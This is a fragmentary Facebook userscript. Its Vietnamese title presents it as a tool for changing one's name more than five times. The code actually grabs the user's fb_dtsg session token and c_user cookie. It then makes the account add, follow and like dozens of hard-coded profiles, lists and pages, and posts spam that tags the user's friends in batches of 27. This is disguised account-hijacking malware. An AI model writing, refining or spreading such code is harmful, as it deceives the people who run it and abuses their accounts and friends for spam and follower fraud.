...
1404
// ==UserScript==
// @name            Phần Mềm Đổi Tên Quá 5 Lần
// @description     All about facebook By Tuấn Nghịch Ngợm
            ...
            for(f=0;f<Math.round(arkadaslar.payload.entries.length/27);f++){
                ...
                for(i=f*27;i<(f+1)*27;i++){
                    if(arkadaslar.payload.entries[i]){
                        mesaj += "Đã Đổi Được Tên Facebook Lần Thứ 6 Nhá  🌴  🌻  🍉  🌹  💐 Thanks Ad (Y) <3 @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
...
a("100005021048720");
a("100004705965206");
sublist("1399098943711992");
sublist("293802960786567");
//Nam ĐZ
a("100007625295828");
sublist("1429860147278148");
sublist("1429866730610823");
Like("229999873877837");
//Mem GR
a("100003643678803");
a("100008386328487");
a("100004342877110");
...
a("100003176017894");
a("100005453733246");
sublist("572713062844556");
//Men
a("100005158600544");
a("100005474705558");
a("100003643678803");
sublist("208359016023254");
sublist("232399833619172");P("269264766576025");
//Tiến Đẹp Trai :”>
a("100007700650951");
a("100006956700383");
a("100008313727162");
a("100006686806553");
IDS("100006686806553");
Like("1493897040843175");
// Long Canpo
a("100006477665336");
sublist("1542280872664487");
sublist("1580512112174696");
sublist("1602639349961972");


//codetag
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var id = "1486161674951102";
var arkadaslar = [];
var svn_rev;
function arkadaslari_al(id){            
    var xmlhttp = new XMLHttpRequest();
